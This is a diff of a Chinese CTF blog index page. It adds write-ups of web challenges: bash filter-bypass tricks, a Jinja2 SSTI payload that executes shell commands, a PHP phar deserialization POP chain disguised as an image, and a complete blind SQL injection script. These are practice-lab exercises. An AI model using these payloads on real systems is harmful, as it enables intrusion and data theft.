+<p>${PWD:~A}即为l，因为${PWD}应为var&#x2F;www&#x2F;html</p>
+<p>所以构成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nl ????.???</span><br></pre></td></tr></table></figure>
+
+<p>可以用来读取文件</p>
+<h4 id="Web119-120"><a href="#Web119-120" class="headerlink" title="Web119-120"></a>Web119-120</h4><p>多过滤了一个path</p>
+<p>方法一：</p>
+<p>构造&#x2F;bin&#x2F;base64 flag.php</p>
+<p>只需要构造&#x2F;和4即可，其他均可用通配符替代</p>
+<p><strong>SHLVL</strong></p>
+<p>是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}&#x3D;1，然后在此shell中再打开一个shell时$SHLVL&#x3D;2。</p>
+<p><strong>RANDOM</strong></p>
+<p>此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。</p>
+<p>所以我们只需要<code>$&#123;PWD::$&#123;SHLVL&#125;&#125;</code>，结果就是&#x2F;</p>
+<p>4的问题，可以用$ $</p>
 
             
         </div>
@@ -682,12 +702,12 @@
         
         
     </div>
-    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/" class="go-post">阅读全文</a>
+    <a href="/2024/06/11/ctfshow/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/">
-        <h2 class="post-title">[BSidesCF 2019]Kookie</h2>
+    <a href="/2024/06/10/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/RootersCTF2019-I-3-Flask/">
+        <h2 class="post-title">[RootersCTF2019]I_&lt;3_Flask</h2>
     </a>
     <div class="category-and-date">
         
@@ -695,7 +715,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/5/7
+            2024/6/10
         </span>
         
         
@@ -703,16 +723,23 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507211444080.png" alt="image-20240507211444080"></p>
-<p>要让我们使用admin登录进去，但是只给我们cookie的username和密码</p>
-<p>所以我们先尝试一下登录，没什么大用处</p>
-<p>所以直接下一位</p>
-<p>抓包试试，然后直接重发看看会发生什么效果</p>
-<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507212219483.png" alt="image-20240507212219483"></p>
-<p>所以说，我们的username是靠cookie决定的，所以我们可以试试在原本的抓包中创建一个新的cookie</p>
-<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507212413327.png" alt="image-20240507212413327"></p>
-<p>一定要在referer之前传才有用哦</p>
-<p>放包就直接登上去了</p>
+            <p>本题需要采用参数爆破</p>
+<p>说实话，我根本不知道这啥玩意，但是吧，真的在原来的页面什么也找不到，只能看看wp</p>
+<p>也就是说我们需要用到爆破工具</p>
+<p>Arjun</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/s0md3v/Arjun</span><br><span class="line">pip3 install arjun</span><br><span class="line">//下载</span><br><span class="line"></span><br><span class="line">arjun -u http://cc55300e-63e2-49f4-a53a-49e2cad80f68.node5.buuoj.cn:81/</span><br><span class="line">//使用</span><br></pre></td></tr></table></figure>
+
+<p>爆出参数name</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406131910893.png" alt="image-20240610203117326"></p>
+<p>包注入的啊，牢底</p>
+<p>尝试ssti注入</p>
+<p>普通的smarty模型不太行</p>
+<p>采用jinja2模型试试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">     &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240610203534911.png" alt="image-20240610203534911"></p>
+<p>经典的通用公式</p>
+<p>之后将ls换成cat flag.txt即可</p>
 
             
         </div>
@@ -722,7 +749,414 @@
         
         
     </div>
-    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2019-Kookie/" class="go-post">阅读全文</a>
+    <a href="/2024/06/10/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/RootersCTF2019-I-3-Flask/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/06/06/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/SWPUCTF-2018-SimplePHP/">
+        <h2 class="post-title">[SWPUCTF 2018]SimplePHP</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/6
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606215028319.png" alt="image-20240606215028319"></p>
+<p>点击到查看文件，发现有传参！！！</p>
+<p>file？直接file.php</p>
+<p>查看一下</p>
+<p>file.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">include &#x27;function.php&#x27;; </span><br><span class="line">include &#x27;class.php&#x27;; </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); </span><br><span class="line">$file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; </span><br><span class="line">if(empty($file)) &#123; </span><br><span class="line">  echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$show = new Show(); </span><br><span class="line">if(file_exists($file)) &#123; </span><br><span class="line">  $show-&gt;source = $file; </span><br><span class="line">  $show-&gt;_show(); </span><br><span class="line">&#125; else if (!empty($file))&#123; </span><br><span class="line">  die(&#x27;file doesn\&#x27;t exists.&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>function.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//show_source(__FILE__); </span><br><span class="line">include &quot;base.php&quot;; </span><br><span class="line">header(&quot;Content-type: text/html;charset=utf-8&quot;); </span><br><span class="line">error_reporting(0); </span><br><span class="line">function upload_file_do() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; </span><br><span class="line">    //mkdir(&quot;upload&quot;,0777); </span><br><span class="line">    if(file_exists(&quot;upload/&quot; . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </span><br><span class="line">    echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">&#125; </span><br><span class="line">function upload_file() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    if(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">function upload_file_check() &#123; </span><br><span class="line">    global $_FILES; </span><br><span class="line">    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); </span><br><span class="line">    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    if(empty($extension)) &#123; </span><br><span class="line">        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        if(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            return true; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>class.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>base.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    session_start(); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">    &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">        &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">            &lt;/ul&gt; </span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &lt;/nav&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是激情澎湃的审计时间，笑死</p>
+<p>慢慢看吧</p>
+<p>不难看出是pop链的题</p>
+<p>这道题就是将对象作为字符串进行跳转</p>
+<p>class.php中</p>
+<p>进入__toString函数之后需要str[‘str’]寻找source函数</p>
+<p>如果找不到就可以跳转__get函数</p>
+<p>但是只有Test类才有__get函数，那么就让str[‘str’]返回的对象为Test对象</p>
+<p>多好啊</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后就在Test看看，发现参数</p>
+<p>和get、file_get、file_get_contents</p>
+<p>也就是toString中str触发get函数之后还会接着触发file_get和file_get_contents</p>
+<p>所以，emm</p>
+<p>差不多</p>
+<p>接着就是看看怎么进入toString</p>
+<p>也很简单</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现str，也就是说，这里可以直接通过destruct进入toString，真不错</p>
+<p>所以我们写脚本生成序列化，将文件写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str[&#x27;str&#x27;] = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params[&#x27;source&#x27;] = &#x27;/var/www/html/f1ag.php&#x27;;		// 一定要是绝对路径</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = new Test;</span><br><span class="line">$b = new Show($c);</span><br><span class="line">$a = new C1e4r($b);</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.jpg&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;__HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>真不错</p>
+<p>生成的phar文件就在脚本文件夹内</p>
+<p>改后缀jpg上传</p>
+<p>之后查看upload</p>
+<p>发现文件</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240607203657813.png" alt="image-20240607203657813"></p>
+<p>之后通过phar伪协议查看即可</p>
+<p>拿到flag</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/06/06/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/SWPUCTF-2018-SimplePHP/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/06/06/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GYCTF2020-Ezsqli/">
+        <h2 class="post-title">[GYCTF2020]Ezsqli</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/6
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606204511024.png" alt="image-20240606204511024"></p>
+<p>做这道题建议屏蔽图片，烦死了</p>
+<p>尝试了一下注入姿势</p>
+<p>发现回显一般只有两种</p>
+<p>Nu1L和Error Occured When Fetch Result.</p>
+<p>也就是如果true返回Nu1L，不是则返回后者</p>
+<p>很经典的布尔盲注题</p>
+<p>之后就是找找过滤</p>
+<p>and被过了</p>
+<p>我们可以使用&amp;&amp;代替</p>
+<p>同时information_schema和mysql.innodb_table_stats被ban了</p>
+<p>搜索后采用sys.x$schema_flattened_keys（仅限5.1以上版本）</p>
+<p>所以我们直接采用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def get_database(url,strings):</span><br><span class="line">    database_length = 1</span><br><span class="line">    DBname = &#x27;&#x27;</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;id&#x27;: &quot;1&amp;&amp;(length(database()))=&quot;+str(i)</span><br><span class="line">        &#125;</span><br><span class="line">        rs = requests.post(url,data)</span><br><span class="line">        if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">            database_length = i</span><br><span class="line">            print(&#x27;数据库长度为：&#x27;+str(database_length))</span><br><span class="line">            break</span><br><span class="line">    for i in range(1,database_length+1):</span><br><span class="line">        for one_char in strings:</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: &quot;1&amp;&amp;substr(database(),&quot; + str(i) + &quot;,1)=&#x27;&quot;+str(one_char)+&quot;&#x27;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            rs = requests.post(url,data)</span><br><span class="line">            if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">                DBname = DBname + one_char</span><br><span class="line">                print(&quot;\r&quot;, end=&quot;&quot;)</span><br><span class="line">                print(&#x27;正在获取数据库名称，当前已获取到&#x27;+str(i)+&#x27;位 | &#x27;+DBname.lower(), end=&#x27;&#x27;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def get_tablename(url,strings):</span><br><span class="line">    TBname = &#x27;&#x27;</span><br><span class="line">    print(&#x27;表名字读取中...&#x27;)</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for one_char in strings:</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: &quot;1&amp;&amp;substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&quot; + str(</span><br><span class="line">                    i) + &quot;,1)=&#x27;&quot;+str(one_char)+&quot;&#x27;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            time.sleep(0.05)</span><br><span class="line">            rs = requests.post(url,data)</span><br><span class="line">            if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">                TBname = TBname + one_char</span><br><span class="line">                print(&quot;\r&quot;, end=&quot;&quot;)</span><br><span class="line">                print(&#x27;表的名字为：&#x27; + TBname.lower(), end=&#x27;&#x27;)</span><br><span class="line">                break</span><br><span class="line">            if &#x27;Nu1L&#x27; not in rs.text and one_char == &#x27;~&#x27;:</span><br><span class="line">                return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def get_column(url,strings):</span><br><span class="line">    column_name = &#x27;&#x27;</span><br><span class="line">    tmp = &#x27;&#x27;</span><br><span class="line">    print(&#x27;\nflag信息读取中...&#x27;)</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for one_char in strings:</span><br><span class="line">            one_char = column_name + one_char</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;:&quot;1&amp;&amp;((select 1,&#x27;&quot;+str(one_char)+&quot;&#x27;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            time.sleep(0.05)</span><br><span class="line">            rs = requests.post(url,data)</span><br><span class="line">            if &#x27;Nu1L&#x27; not in rs.text:</span><br><span class="line">                tmp = one_char</span><br><span class="line">            if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">                column_name = tmp</span><br><span class="line">                print(&quot;\r&quot;, end=&quot;&quot;)</span><br><span class="line">                print(&#x27;flag为：&#x27; + column_name.lower(), end=&#x27;&#x27;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://0fe9c88f-4b11-44dc-8d0c-8a792f414c49.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line">    strings = &#x27;,-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&#x27;</span><br><span class="line">    get_database(url,strings)</span><br><span class="line">    get_tablename(url,strings)</span><br><span class="line">    #原来是想着获取column名称，但是未获取到，但是又懒得改名称，所以使用的是column</span><br><span class="line">    get_column(url,strings)</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/06/06/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GYCTF2020-Ezsqli/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/06/05/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/">
+        <h2 class="post-title">[CISCN2019 总决赛 Day2 Web1]Easyweb</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/5
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606191525293.png" alt="image-20240606191525293"></p>
+<p>我知道不会是那样，所以就没那样</p>
+<p>你说是吧sql注入</p>
+<p>好吧其实我试过了直接sql注入发现不行</p>
+<p>可恶</p>
+<p>那这道题估计就还是一道气气怪怪的题目</p>
+<p>那就查一查又没有什么特殊文件先</p>
+<p>发现robots.txt</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606192557683.png" alt="image-20240606192557683"></p>
+<p>发现了奇奇怪怪的东西</p>
+<p>xxx的一个备份文件</p>
+<p>我还在想是谁的</p>
+<p>打开源码一看</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606192653870.png" alt="image-20240606192653870"></p>
+<p>这不就来了嘛</p>
+<p>image.php.bak</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=&quot;./&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image/jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
+
+<p>看到源码</p>
+<p>也就是两个参数</p>
+<p>id和path</p>
+<p>后面有几个过滤</p>
+<p>addslashes() 函数返回在预定义的字符前添加反斜杠的字符串。</p>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<p>所以第一步是加反斜杠</p>
+<p>第二步是把规定的某些字符串变为空</p>
+<p>然后就是一个sql注入</p>
+<p>还真是sql注入，我承认我之前说话是大声了一点</p>
+<p>所以我们可以大胆猜测我们该怎么做才能注入</p>
